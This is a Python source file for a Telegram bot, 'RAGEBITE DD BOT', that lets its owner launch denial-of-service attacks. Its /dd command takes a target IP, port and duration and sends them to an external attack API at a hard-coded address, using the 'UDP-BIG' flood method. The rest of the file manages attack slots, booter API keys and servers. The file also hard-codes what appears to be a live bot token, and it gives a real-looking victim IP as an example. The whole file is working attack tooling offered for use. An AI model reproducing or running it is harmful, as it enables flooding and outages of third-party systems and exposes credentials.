"""
⚔️ RAGEBITE DD BOT
Owner ke liye /dd command + all management
"""

import os
import sqlite3
import threading
import asyncio
from datetime import datetime, timedelta

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import requests


# ============================================================
# ⚙️ CONFIGURATION
# ============================================================
DD_BOT_TOKEN = "8650600804:AAFw-AuiLMtbUUHIbqwdPzVeOG8s11yfdA8"
OWNER_ID = 6321758394

ATTACK_API_URL = "http://176.100.37.127:3001/api/v1/attack/start"
DEFAULT_METHOD = "UDP-BIG"

DB_NAME = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ragebite.db')


# ============================================================
# 📦 DATABASE
# ============================================================
def get_conn():
    return sqlite3.connect(DB_NAME, check_same_thread=False)


def get_max_slots():
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key='max_slots'")
    row = c.fetchone()
    conn.close()
    return int(row[0]) if row else 4


def get_free_slot():
    max_slots = get_max_slots()
    conn = get_conn()
    c = conn.cursor()
    c.execute('''SELECT slot_id FROM slots 
                 WHERE is_active=0 AND slot_id <= ? 
                 ORDER BY slot_id ASC LIMIT 1''', (max_slots,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


def allot_slot_manual(slot_id, ip, port, time_sec, key="owner_manual"):
    start = datetime.now()
    end = start + timedelta(seconds=time_sec)
    conn = get_conn()
    c = conn.cursor()
    c.execute('''UPDATE slots SET device_id=?, key=?, package_name=?, 
                 ip=?, port=?, time_sec=?, start_time=?, end_time=?, is_active=1 
                 WHERE slot_id=?''',
              ("owner_manual", key, "manual",
               ip, port, time_sec,
               start.strftime('%Y-%m-%d %H:%M:%S'),
               end.strftime('%Y-%m-%d %H:%M:%S'),
               slot_id))
    conn.commit()
    conn.close()


def release_slot(slot_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''UPDATE slots SET device_id=NULL, key=NULL, package_name=NULL,
                 ip=NULL, port=NULL, time_sec=NULL, start_time=NULL,
                 end_time=NULL, is_active=0 WHERE slot_id=?''', (slot_id,))
    conn.commit()
    conn.close()


def get_all_slots():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT * FROM slots ORDER BY slot_id')
    rows = c.fetchall()
    conn.close()
    return rows


def get_queue_count():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM queue')
    count = c.fetchone()[0]
    conn.close()
    return count


def get_active_api_key():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT api_key FROM api_keys WHERE is_active = 1 ORDER BY added_at DESC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


def add_api_key(name, api_key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO api_keys (name, api_key, added_at, is_active) VALUES (?, ?, ?, 1)',
              (name, api_key, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()


def delete_api_key(name):
    conn = get_conn()
    c = conn.cursor()
    c.execute('DELETE FROM api_keys WHERE name = ?', (name,))
    conn.commit()
    conn.close()


def get_all_api_keys():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT name, api_key, added_at FROM api_keys ORDER BY added_at DESC')
    rows = c.fetchall()
    conn.close()
    return rows


def add_server(name, ip, port):
    conn = get_conn()
    c = conn.cursor()
    c.execute('INSERT INTO servers (name, ip, port) VALUES (?, ?, ?)', (name, ip, port))
    conn.commit()
    conn.close()


def get_all_servers():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT name, ip, port FROM servers')
    rows = c.fetchall()
    conn.close()
    return rows


def call_external_attack_api(ip, port, time_sec, method=None):
    if method is None:
        method = DEFAULT_METHOD
    api_key = get_active_api_key()
    if not api_key:
        return False, "No API key configured"
    params = {"key": api_key, "ip": ip, "port": port, "time": time_sec, "method": method}
    try:
        print(f"🎯 Attack API: {ip}:{port} for {time_sec}s")
        response = requests.get(ATTACK_API_URL, params=params, timeout=15)
        print(f"📡 Response: {response.status_code}")
        if response.status_code == 200:
            return True, "Started"
        return False, f"HTTP {response.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)}"


# ============================================================
# ⚔️ COMMANDS
# ============================================================
async def d_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only Owner")
        return
    msg = ("⚔️ *RAGEBITE DD BOT* ⚔️\n\n"
           "🎯 *Attack:*\n"
           "`/dd <ip> <port> <time>`\n"
           "Example: `/dd 1.2.3.4 8080 30`\n\n"
           "📊 *Status:*\n"
           "`/slots` — Slot status\n\n"
           "🔑 *API Keys:*\n"
           "`/addapikey <name> <key>`\n"
           "`/delapikey <name>` | `/listapikeys`\n\n"
           "🌐 *Servers:*\n"
           "`/addserver <name> <ip> <port>` | `/listservers`")
    await update.message.reply_text(msg, parse_mode='Markdown')


async def d_dd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🎯 Manual /dd command — Owner ke liye"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only Owner")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "❌ *Format:* `/dd <ip> <port> <time>`\n\n"
            "*Example:*\n"
            "`/dd 34.0.14.146 29990 30`",
            parse_mode='Markdown'
        )
        return

    ip, port, time_str = args

    try:
        time_sec = int(time_str)
        if time_sec < 10 or time_sec > 300:
            await update.message.reply_text("❌ Time must be 10-300 seconds")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid time")
        return

    # Free slot check
    slot_id = get_free_slot()
    if slot_id is None:
        await update.message.reply_text("⚠️ All slots are full. Wait.")
        return

    # API key check
    api_key = get_active_api_key()
    if not api_key:
        await update.message.reply_text(
            "❌ *No API key configured!*\n\n"
            "Add one first:\n"
            "`/addapikey premium nk_xxxxx`",
            parse_mode='Markdown'
        )
        return

    # Slot allot
    allot_slot_manual(slot_id, ip, port, time_sec)
    await update.message.reply_text(
        f"⚡ *Slot #{slot_id} Allotted!*\n🎯 Starting attack...",
        parse_mode='Markdown'
    )

    # API call background me
    loop = asyncio.get_event_loop()

    def call_api():
        success, message = call_external_attack_api(ip, port, time_sec)
        if success:
            end_time = (datetime.now() + timedelta(seconds=time_sec)).strftime('%H:%M:%S')
            text = (f"✅ *ATTACK STARTED*\n\n"
                    f"🎯 Slot: #{slot_id}\n"
                    f"🌐 IP: `{ip}`\n"
                    f"🔌 Port: `{port}`\n"
                    f"⏱️ Time: {time_sec}s\n"
                    f"🕐 Ends: {end_time}")
        else:
            text = f"❌ *FAILED*\n`{message}`"
            release_slot(slot_id)

        try:
            asyncio.run_coroutine_threadsafe(
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=text,
                    parse_mode='Markdown'
                ),
                loop
            )
        except Exception as e:
            print(f"Reply error: {e}")

    threading.Thread(target=call_api, daemon=True).start()


async def d_slots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    max_slots = get_max_slots()
    slots = get_all_slots()
    msg = f"📊 *SLOTS (Total: {max_slots})*\n\n"
    for s in slots:
        if s[0] > max_slots:
            continue
        if s[9] == 1:
            rem = (datetime.strptime(s[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            dev = (s[1][:10] + "...") if s[1] else "?"
            msg += f"🔴 Slot #{s[0]} — `{dev}` | {s[4]}:{s[5]} | {rem}s\n"
        else:
            msg += f"🟢 Slot #{s[0]}: FREE\n"
    msg += f"\n📋 Queue: {get_queue_count()}"
    await update.message.reply_text(msg, parse_mode='Markdown')


async def d_addapikey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or len(context.args) < 2:
        return
    name = context.args[0].lower()
    api_key = context.args[1]
    add_api_key(name, api_key)
    await update.message.reply_text(
        f"✅ Added `{name}`\nKey: `{api_key[:20]}...`",
        parse_mode='Markdown')


async def d_delapikey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    delete_api_key(context.args[0].lower())
    await update.message.reply_text(f"🗑️ Deleted", parse_mode='Markdown')


async def d_listapikeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    rows = get_all_api_keys()
    if not rows:
        await update.message.reply_text("📭 None")
        return
    msg = f"🔑 *API Keys ({len(rows)})*\n\n"
    for i, r in enumerate(rows, 1):
        msg += f"*{i}. {r[0]}*\n`{r[1][:20]}...`\n\n"
    await update.message.reply_text(msg, parse_mode='Markdown')


async def d_addserver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or len(context.args) != 3:
        return
    add_server(*context.args)
    await update.message.reply_text(f"✅ Server added")


async def d_listservers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    rows = get_all_servers()
    if not rows:
        await update.message.reply_text("❌ None")
        return
    msg = "🌐 *Servers:*\n\n"
    for i, r in enumerate(rows, 1):
        msg += f"{i}. {r[0]}: `{r[1]}:{r[2]}`\n"
    await update.message.reply_text(msg, parse_mode='Markdown')


# ============================================================
# 🔄 AUTO-RELEASE LOOP
# ============================================================
async def auto_release_loop(application):
    while True:
        try:
            conn = get_conn()
            c = conn.cursor()
            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            c.execute('''SELECT slot_id, device_id FROM slots 
                         WHERE is_active=1 AND end_time <= ?''', (now,))
            expired = c.fetchall()
            conn.close()

            for slot_id, device_id in expired:
                release_slot(slot_id)
                print(f"✅ Released Slot #{slot_id}")
                try:
                    await application.bot.send_message(
                        chat_id=OWNER_ID,
                        text=f"⏰ Slot #{slot_id} is now free."
                    )
                except:
                    pass
        except Exception as e:
            print(f"Auto-release: {e}")
        await asyncio.sleep(5)


async def post_init(application):
    asyncio.create_task(auto_release_loop(application))


# ============================================================
# 🚀 MAIN
# ============================================================
def main():
    print("=" * 60)
    print("⚔️ RAGEBITE DD BOT")
    print("=" * 60)

    d_app = Application.builder().token(DD_BOT_TOKEN).post_init(post_init).build()
    d_app.add_handler(CommandHandler("start", d_start))
    d_app.add_handler(CommandHandler("dd", d_dd_command))
    d_app.add_handler(CommandHandler("slots", d_slots))
    d_app.add_handler(CommandHandler("addapikey", d_addapikey))
    d_app.add_handler(CommandHandler("delapikey", d_delapikey))
    d_app.add_handler(CommandHandler("listapikeys", d_listapikeys))
    d_app.add_handler(CommandHandler("addserver", d_addserver))
    d_app.add_handler(CommandHandler("listservers", d_listservers))

    print("⚔️ DD Bot running...")
    print("=" * 60)
    d_app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
